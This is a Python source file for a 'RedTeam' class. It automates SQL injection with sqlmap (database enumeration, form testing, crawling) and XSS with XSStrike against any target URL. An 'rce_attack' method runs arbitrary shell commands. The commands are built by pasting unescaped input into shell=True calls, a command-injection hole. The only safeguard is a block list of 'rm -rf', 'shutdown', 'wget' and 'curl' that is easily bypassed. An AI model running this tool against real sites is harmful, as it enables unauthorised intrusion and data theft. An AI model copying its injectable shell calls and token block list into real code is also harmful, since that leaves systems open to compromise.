import subprocess
from log_manager import log_attack

class RedTeam:
    def sql_injection(self, target_url):
        """Launches SQL Injection on the target website."""
        command = f"sqlmap -u {target_url} --batch --dbs --forms --crawl=2"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        
        log_attack("SQL Injection", target_url, result.stdout)
        return result.stdout

    def xss_attack(self, target_url, payload="<script>alert('XSS')</script>"):
        """Performs an XSS attack with a given payload."""
        command = f"xsstrike -u {target_url} --payload '{payload}'"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        
        log_attack("XSS", target_url, result.stdout)
        return result.stdout

    def rce_attack(self, command):
        """Attempts Remote Code Execution (RCE)"""
        dangerous_commands = ["rm -rf", "shutdown", "wget", "curl"]
        if any(cmd in command for cmd in dangerous_commands):
            return "[ERROR] Dangerous command blocked."

        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        log_attack("RCE", "Local System", result.stdout)
        return result.stdout
